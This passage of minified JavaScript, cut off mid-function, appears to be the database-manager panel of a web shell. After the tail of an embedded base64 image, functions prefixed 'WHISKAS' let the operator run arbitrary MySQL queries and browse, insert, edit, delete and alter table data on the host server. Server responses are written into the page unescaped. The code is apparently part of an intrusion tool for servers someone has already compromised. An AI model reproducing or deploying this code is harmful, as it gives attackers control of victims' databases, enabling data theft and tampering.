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"}function WHISKASMysqlQuery(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" textarea[name=query]").value;WHISKASMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_load_query_data",db_info:{query:i},post:{WHISKAS2:"query"}},function(e){0!=e.length&&(e=JSON.parse(e),WHISKASMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.status?e.table:"",WHISKASMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0))})}function WHISKASMysqlReportBuilder(e,t){var a="";t.status||(a="<div><span>Error: </span><div style='padding-left: 50px;'><pre>"+t.error+"</pre></div></div>");var i="<div><span>Query:</span><div style='padding-left: 50px;'><pre>"+t.query+"</pre></div>"+a+"</div>";d.querySelector("#"+e+" .mysql-query-reporter").innerHTML=i}function WHISKASMysqlTablePanelCtl(e){var t=e.getAttribute("db_id"),a=(t=e.getAttribute("db_id"),d.querySelector("#"+t)),i=a.querySelector(".tables-panel-ctl");"none"==i.getAttribute("mode")?(a.querySelector(".mysql-tables").style.display="block",i.setAttribute("mode","block"),i.innerHTML="&#x3C;&#x3C;",a.querySelector(".mysql-query-results-fixed").classList.remove("mysql-query-results-fixed")):(a.querySelector(".mysql-tables").style.display="none",i.setAttribute("mode","none"),i.innerHTML="&#x3E;&#x3E;",a.querySelector(".mysql-query-results").classList.add("mysql-query-results-fixed")),i.classList.toggle("tables-panel-ctl-min")}function WHISKASMysqlTabCtl(e,t){var a=void 0===t?e.getAttribute("db_id"):e.db_id,i=void 0===t?e.getAttribute("target"):e.target;d.querySelectorAll("#"+a+" .mysql-query-content").forEach(function(e){e.classList.add("mysql-hide-content")}),d.querySelector("#"+a+" .mysql-query-result-tabs .mysql-query-selected-tab").classList.remove("mysql-query-selected-tab"),void 0===t?e.classList.add("mysql-query-selected-tab"):d.querySelector("#"+a+" .mysql-query-result-tabs div:nth-child("+e.child+")").classList.add("mysql-query-selected-tab"),d.querySelector("#"+a+" "+i).classList.remove("mysql-hide-content")}function WHISKASLoadTableData(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id");WHISKASMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_load_table_data",db_info:{table:t},post:{WHISKAS2:"load_data"}},function(e){if(0!=e.length){e=JSON.parse(e);var l="",r="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#000000;'><th>Column</th><th>Type</th><th>Value</th></tr>",o="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#000000;'><th>Column</th><th>Type</th><th>Value</th><th>Change</th></tr>",n="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#000000;'><th>Column</th><th>Type</th><th>Collation</th><th>Operator</th><th>Value</th></tr>",s=["int","smallint","bigint","tinyint","mediumint"],c=["longtext","text","mediumtext","tinytext"];for(var u in e.columns){var p="text";-1!=s.indexOf(e.columns[u].data_type)&&(p="number"),n+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+e.columns[u].collation+"</td><td><select name='"+e.columns[u].name+"'><option value='='>=</option><option value='!='>!=</option><option value='>'>&gt;</option><option value='>='>&gt;=</option><option value='<'>&lt;</option><option value='<='>&lt;=</option><option value=\"= ''\">= ''</option><option value=\"!= ''\">!= ''</option><option value='LIKE'>LIKE</option><option value='LIKE %...%'>LIKE %...%</option><option value='NOT LIKE'>NOT LIKE</option><option value='REGEXP'>REGEXP</option><option value='REGEXP ^...$'>REGEXP ^...$</option><option value='NOT REGEXP'>NOT REGEXP</option><option value='IN (...)'>IN (...)</option><option value='NOT IN (...)'>NOT IN (...)</option><option value='BETWEEN'>BETWEEN</option><option value='NOT BETWEEN'>NOT BETWEEN</option><option value='IS NULL'>IS NULL</option><option value='IS NOT NULL'>IS NOT NULL</option></select></td><td><input type='"+p+"' name='"+e.columns[u].name+"'></td></tr>";var f=WHISKASMysqlLoadDataType(e.columns[u].data_type);null==e.columns[u].type_value&&(e.columns[u].type_value=""),o+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td><select name='sel_"+e.columns[u].name+"'>"+f+"</select></td><td><input name='value_"+e.columns[u].name+"' type='text' value='"+(-1==c.indexOf(e.columns[u].data_type)?e.columns[u].type_value:"")+"'></td><td><button col_name='"+e.columns[u].name+"' tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='WHISKASMysqlAlterTbl(this);return false;'>Change</button></td></tr>";var m="";switch(e.columns[u].data_type){case"longtext":case"text":m="<textarea name='"+e.columns[u].name+"' rows='5'></textarea>";break;case"int":case"smallint":case"bigint":m="<input type='number' name='"+e.columns[u].name+"' value=''>";break;default:m="<input type='text' name='"+e.columns[u].name+"' value=''>"}r+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+m+"</td></tr>"}if(r+="</table><div style='margin-left:20px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='WHISKASMysqlUpdateRow(this, \"insert\");return false;'>Insert</button></div><div class='mysql-insert-result'></div>",o+="</table><div class='mysql-structure-qres'></div>",n+="</table><div style='padding-left: 384px;margin-top: 15px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='WHISKASMysqlSearch(this);return false;'>Search</button></div>",e.pages>0){l+="<span style='cursor:pointer;' db_id='"+i+"' onclick='WHISKASMysqlChangePage(this,1);'><<</span> <span> page: </span> <select tbl_name='"+t+"' db_target='"+a+"' name='mysql-q-pages' db_id='"+i+"' class='db-opt-id' onchange='WHISKASMysqlChangePage(this);' pages='"+e.pages+"'>";for(var b=1;b<e.pages+1;b++)l+="<option>"+b+"</option>";l+="</select><span> Of "+e.pages+"</span> <span style='cursor:pointer;' db_id='"+i+"' onclick='WHISKASMysqlChangePage(this,2);'>>></span>"}var y=d.querySelector("#"+i);y.querySelector(".mysql-search-area").innerHTML=n,y.querySelector(".mysql-insert-row").innerHTML=r,y.querySelector(".mysql-edit-row").innerHTML="",y.querySelector(".mysql-structure").innerHTML=o,y.querySelector(".mysql-query-result-header .mysql-query-pager").innerHTML=l,y.querySelector(".mysql-query-table").innerHTML=e.status?e.table:"",WHISKASMysqlTabCtl({child:1,db_id:i,target:".mysql-query-result-content"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="none",WHISKASMysqlReportBuilder(i,e)}})}function WHISKASMysqlAlterTbl(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r=e.getAttribute("col_name"),o={};o.type=i.querySelector(".mysql-structure select[name=sel_"+r+"]").value,o.input=i.querySelector(".mysql-structure input[name=value_"+r+"]").value,WHISKASMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_alter",db_info:{table:l,column:r,alter:o},post:{WHISKAS2:"alter"}},function(e){var t=d.querySelector("#"+a+" .mysql-structure-qres");t.innerHTML=e,t.style.display="block"})}function WHISKASMysqlSearch(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r={};i.querySelectorAll(".mysql-search-area input, .mysql-search-area select").forEach(function(e){r.hasOwnProperty(e.name)||(r[e.name]={}),"SELECT"==e.tagName?r[e.name].opt=e.value:r[e.name].value=e.value}),WHISKASMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_search_query",db_info:{table:l,search:r},post:{WHISKAS2:"search"}},function(e){0!=e.length&&(e=JSON.parse(e),WHISKASMysqlReportBuilder(a,e),WHISKASMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function WHISKASMysqlEditRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=(d.querySelector("#"+i),e.getAttribute("col_key")),r=e.getAttribute("key"),o=e.getAttribute("tbl_name"),n=e.getAttribute("row_id");WHISKASMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_table_edit_query",db_info:{table:o,col_key:l,key:r},post:{WHISKAS2:t}},function(e){if(0!=e.length)if(e=JSON.parse(e),"edit"==t){var s="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#000000;'><th>Column</th><th>Type</th><th>Value</th></tr>";for(var c in e){var u="";switch(e[c].type.tag){case"textarea":u="<textarea name='"+e[c].col+"' rows='5'>"+e[c].value+"</textarea>";break;case"input":u="<input type='"+e[c].type.type+"' name='"+e[c].col+"' value='"+e[c].value+"'>"}s+="<tr><th style='text-align: left;'>"+e[c].col+"</th><td>"+e[c].type.col_type+"</td><td>"+u+"</td></tr>"}s+="</table><div style='margin-left:20px;'><button col_key='"+l+"' key='"+r+"' tbl_name='"+o+"' db_id='"+i+"' db_target='"+a+"' onclick='WHISKASMysqlUpdateRow(this, \"edit\");return false;'>Update</button></div><div class='mysql-update-result'></div>",d.querySelector("#"+i+" .mysql-edit-row").innerHTML=s,WHISKASMysqlTabCtl({child:6,db_id:i,target:".mysql-edit-row"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="inline-block"}else"delete"==t&&(e.status?d.querySelector("#"+i+" .tbl_row_l"+n).remove():alert(e.error))})}function WHISKASMysqlTblSelectAll(e){var t=e.getAttribute("db_id");d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(t){t.checked=e.checked})}function WHISKASMysqlDeleteAllSelectedrows(e){var t=e.getAttribute("db_id"),a=e.getAttribute("db_target"),i=e.getAttribute("col_key"),l=e.getAttribute("tbl_name"),r=[];if(d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&r.push(e.value)}),0==r.length)return!1;WHISKASMysqlApi({db_id:t,db_target:a,ajax_id:"mysql_table_delete_all_query",db_info:{table:l,col_key:i,rows:r},post:{WHISKAS2:"delete_all"}},function(e){if(""!=e)if((e=JSON.parse(e)).status){var a=0,i=d.querySelector("#"+t);d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&(a=e.getAttribute("row_id"),i.querySelector(".tbl_row_l"+a).remove())})}else alert(e.error)})}function WHISKASMysqlUpdateRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=d.querySelector("#"+i),r=".mysql-insert-row",o=".mysql-insert-result",n="mysql_table_insert_query",s="insert",c={table:e.getAttribute("tbl_name")};if("edit"==t){var u=e.getAttribute("col_key"),p=e.getAttribute("key");r=".mysql-edit-row",o=".mysql-update-result",n="mysql_table_update_query",s="update",c.col_key=u,c.key=p}var f={};l.querySelectorAll(r+" input, "+r+" textarea").forEach(function(e){f.hasOwnProperty(e.name)||(f[e.name]={}),f[e.name]=e.value}),c.data=f,WHISKASMysqlApi({db_id:i,db_target:a,ajax_id:n,db_info:c,post:{WHISKAS2:s}},function(e){if(0!=e.length){e=JSON.parse(e);var t=d.querySelector("#"+i+" "+o);t.style.display="block",e.status?t.innerHTML="Success...":t.innerHTML=e.error}})}function WHISKASMysqlLoadDataType(e){e=e.toUpperCase();var t=["INT","VARCHAR","TEXT","DATE",{key:"Numeric",vals:["TINYINT","SMALLINT","MEDIUMINT","INT","BIGINT","-","DECIMAL","FLOAT","DOUBLE","REAL","-","BIT","BOOLEAN","SERIAL"]},{key:"Date and time",vals:["DATE","DATETIME","TIMESTAMP","TIME","YEAR"]},{key:"String",vals:["CHAR","VARCHAR","-","TINYTEXT","TEXT","MEDIUMTEXT","LONGTEXT","-","BINARY","VARBINARY","-","TINYBLOB","MEDIUMBLOB","BLOB","LONGBLOB","-","ENUM","SET"]},{key:"Spatial",vals:["GEOMETRY","POINT","LINESTRING","POLYGON","MULTIPOINT","MULTILINESTRING","MULTIPOLYGON","GEOMETRYCOLLECTION"]},{key:"JSON",vals:["JSON"]}],a="",i=!1;for(var l in t)if("object"==typeof t[l]){for(var r in a+='<optgroup label="'+t[l].key+'">',t[l].vals)a+="<option"+(t[l].vals[r]!=e||i?"":" selected")+">"+t[l].vals[r]+"</option>",t[l].vals[r]==e&&(i=!0);a+="</optgroup>"}else a+="<option"+(t[l]!=e||i?"":" selected")+">"+t[l]+"</option>",t[l]==e&&(i=!0);return a}function WHISKASMysqlChangePage(e,t){var a=e.getAttribute("db_id"),i=0;if(void 0!==t){e=d.querySelector("#"+a+" select[name=mysql-q-pages]");var 